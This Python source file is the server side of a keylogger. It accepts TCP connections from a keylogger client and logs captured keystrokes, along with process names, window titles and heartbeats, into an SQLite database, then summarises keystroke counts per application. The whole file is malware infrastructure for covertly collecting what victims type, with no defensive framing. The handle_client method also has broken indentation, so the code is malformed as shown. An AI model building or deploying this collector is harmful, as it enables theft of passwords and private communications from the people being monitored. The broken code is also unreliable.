#!/usr/bin/env python3
"""
Python Server Example for Keylogger Client
Receives JSON data from the keylogger and processes it
"""

import socket
import json
import threading
import time
from datetime import datetime
import sqlite3
import os
import select

class KeyloggerServer:
    def __init__(self, host='127.0.0.1', port=65432):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.running = False
        
        # Initialize database
        self.init_database()
        
    def init_database(self):
        """Initialize SQLite database for storing keylogger data"""
        self.db_path = 'keylogger_data.db'
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Create tables
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keystrokes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                pid INTEGER,
                process TEXT,
                window TEXT,
                data TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS process_changes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                pid INTEGER,
                process TEXT,
                command TEXT,
                window TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS heartbeats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                pid INTEGER,
                process TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        print(f"Database initialized: {self.db_path}")
    
    def save_keystroke(self, data):
        """Save keystroke data to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO keystrokes (timestamp, pid, process, window, data)
            VALUES (?, ?, ?, ?, ?)
        ''', (data['timestamp'], data['pid'], data['process'], data['window'], data['data']))
        conn.commit()
        conn.close()
    
    def save_process_change(self, data):
        """Save process change data to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO process_changes (timestamp, pid, process, command, window)
            VALUES (?, ?, ?, ?, ?)
        ''', (data['timestamp'], data['pid'], data['process'], data['command'], data['window']))
        conn.commit()
        conn.close()
    
    def save_heartbeat(self, data):
        """Save heartbeat data to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO heartbeats (timestamp, pid, process)
            VALUES (?, ?, ?)
        ''', (data['timestamp'], data['pid'], data['process']))
        conn.commit()
        conn.close()
    
    def process_message(self, message):
        """Process received JSON message"""
        try:
            data = json.loads(message.strip())
            msg_type = data.get('type')
            
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Received: {msg_type}")
            
            if msg_type == 'keystroke':
                print(f"  Keystroke: PID={data['pid']}, Process={data['process']}, Window={data['window']}, Data={data['data']}")
                self.save_keystroke(data)
                
            elif msg_type == 'process_change':
                print(f"  Process Change: PID={data['pid']}, Process={data['process']}, Window={data['window']}")
                self.save_process_change(data)
                
            elif msg_type == 'initial_process':
                print(f"  Initial Process: PID={data['pid']}, Process={data['process']}, Window={data['window']}")
                self.save_process_change(data)
                
            elif msg_type == 'heartbeat':
                print(f"  Heartbeat: PID={data['pid']}, Process={data['process']}")
                self.save_heartbeat(data)
                
            elif msg_type == 'shutdown':
                print(f"  Client Shutdown: {data['timestamp']}")
                
            else:
                print(f"  Unknown message type: {msg_type}")
                
        except json.JSONDecodeError as e:
            print(f"Error parsing JSON: {e}")
            print(f"Raw message: {message}")
        except Exception as e:
            print(f"Error processing message: {e}")
    
    def handle_client(self, client_socket, client_address):
        """Handle individual client connection"""
        print(f"Client connected: {client_address}")
        
        # Set socket options for better connection handling
        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
        client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
        client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
        
        # Set timeout for receive operations
        client_socket.settimeout(30.0)  # 30 second timeout
        
        try:
            buffer = ""
            while self.running:
                try:
                    # Use select to check if data is available
                    ready = select.select([client_socket], [], [], 1.0)[0]
                    if not ready:
                        continue
                    
                data = client_socket.recv(4096)
                if not data:
                        print(f"Client {client_address} disconnected (no data)")
                    break
                
                buffer += data.decode('utf-8', errors='ignore')
                
                # Process complete messages (separated by newlines)
                while '\n' in buffer:
                    message, buffer = buffer.split('\n', 1)
                    if message.strip():
                        self.process_message(message)
                            
                except socket.timeout:
                    # Timeout is normal, continue
                    continue
                except socket.error as e:
                    print(f"Socket error for client {client_address}: {e}")
                    break
                        
        except Exception as e:
            print(f"Error handling client {client_address}: {e}")
        finally:
            print(f"Client disconnected: {client_address}")
            if client_socket in self.clients:
                self.clients.remove(client_socket)
            try:
            client_socket.close()
            except:
                pass
    
    def start(self):
        """Start the server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1.0)  # 1 second timeout for accept
            self.running = True
            
            print(f"Keylogger server started on {self.host}:{self.port}")
            print("Waiting for connections...")
            
            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    self.clients.append(client_socket)
                    
                    # Start a new thread to handle this client
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.timeout:
                    # Timeout is normal, continue
                    continue
                except KeyboardInterrupt:
                    print("\nShutting down server...")
                    self.running = False
                    break
                except Exception as e:
                    print(f"Accept error: {e}")
                    continue
                    
        except Exception as e:
            print(f"Server error: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Stop the server"""
        self.running = False
        
        # Close all client connections
        for client in self.clients:
            try:
                client.close()
            except:
                pass
        self.clients.clear()
        
        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        print("Server stopped")
    
    def get_statistics(self):
        """Get statistics from database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Get counts
        cursor.execute("SELECT COUNT(*) FROM keystrokes")
        keystroke_count = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM process_changes")
        process_change_count = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM heartbeats")
        heartbeat_count = cursor.fetchone()[0]
        
        # Get recent activity
        cursor.execute("""
            SELECT process, COUNT(*) as count 
            FROM keystrokes 
            WHERE created_at > datetime('now', '-1 hour')
            GROUP BY process 
            ORDER BY count DESC 
            LIMIT 5
        """)
        recent_processes = cursor.fetchall()
        
        conn.close()
        
        print(f"\n=== Statistics ===")
        print(f"Total keystrokes: {keystroke_count}")
        print(f"Total process changes: {process_change_count}")
        print(f"Total heartbeats: {heartbeat_count}")
        print(f"\nRecent activity (last hour):")
        for process, count in recent_processes:
            print(f"  {process}: {count} keystrokes")

def main():
    server = KeyloggerServer()
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\nShutting down...")
    finally:
        server.stop()
        server.get_statistics()

if __name__ == "__main__":
    main() 